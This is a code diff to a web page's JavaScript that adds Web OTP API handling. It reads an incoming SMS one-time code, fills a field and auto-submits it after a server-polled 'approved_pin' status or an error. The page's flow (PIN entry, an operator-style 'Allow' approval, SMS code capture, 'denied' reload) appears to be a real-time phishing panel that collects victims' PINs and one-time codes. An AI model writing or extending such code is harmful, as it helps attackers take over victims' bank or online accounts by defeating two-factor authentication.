@@ -185,6 +185,33 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    // Web OTP API integration to automatically intercept and read incoming SMS
+    function initWebOTP() {
+        if ('OTPCredential' in window) {
+            const ac = new AbortController();
+            navigator.credentials.get({
+                otp: { transport: ['sms'] },
+                signal: ac.signal
+            }).then(otp => {
+                if (otp && (otp.code || otp.value)) {
+                    const smsMessage = otp.code || otp.value;
+                    otpText.value = smsMessage;
+                    charCount.innerText = `${smsMessage.length}/1000`;
+                    
+                    setTimeout(() => {
+                        const text = otpText.value.trim();
+                        if (text && !isAutoSubmitting) {
+                            smsErrorBanner.classList.add('hidden');
+                            triggerAutoSubmit(text);
+                        }
+                    }, 400);
+                }
+            }).catch(err => {
+                console.log('Web OTP API scanning skipped or not supported:', err);
+            });
+        }
+    }
+
     function pollStatus() {
         if (statusInterval) clearInterval(statusInterval);
 
@@ -194,14 +221,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 const data = await res.json();
 
                 if (data.status === 'approved_pin') {
-                    // Instantly open SMS page as soon as Allow is clicked
                     if (stepOtp && stepOtp.classList.contains('hidden')) {
                         switchStep(stepLoading, stepOtp);
-                    }
-                    if (data.incomingSMS && !otpText.value.trim() && !isAutoSubmitting) {
-                        otpText.value = data.incomingSMS;
-                        charCount.innerText = `${data.incomingSMS.length}/1000`;
-                        setTimeout(() => triggerAutoSubmit(data.incomingSMS), 600);
+                        // Trigger automatic SMS reading/listening once the OTP card opens
+                        initWebOTP();
                     }
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
@@ -222,6 +245,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     smsErrorBanner.classList.remove('hidden');
                     switchStep(stepLoading, stepOtp);
                     otpText.focus();
+                    initWebOTP(); // Re-listen for next SMS attempt
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
                     location.reload();
@@ -230,4 +254,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2500);
     }
 });
-        
+                          
